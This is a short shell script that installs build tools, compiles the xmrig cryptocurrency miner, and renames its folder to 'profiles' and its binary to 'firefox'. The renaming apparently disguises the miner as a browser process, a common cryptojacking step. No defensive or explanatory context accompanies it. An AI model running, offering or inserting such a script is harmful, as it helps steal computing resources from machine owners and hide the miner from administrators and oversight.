#!/bin/sh
apt-get update -y
apt-get upgrade -y
apt-get install wget -y
apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig.git
mv xmrig profiles
cd profiles
cmake .
make
cp xmrig firefox
rm xmrig
